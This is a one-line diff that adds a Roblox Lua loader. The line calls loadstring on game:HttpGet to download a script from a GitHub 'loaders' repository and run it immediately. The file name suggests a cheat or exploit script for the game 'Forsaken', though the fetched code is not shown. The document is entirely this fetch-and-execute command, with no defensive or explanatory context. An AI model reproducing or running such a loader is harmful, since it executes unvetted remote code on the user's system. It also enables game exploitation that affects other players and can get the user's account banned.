@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/upd-forsaken-spam4-v7xmijcwhfq27r.lua"))()
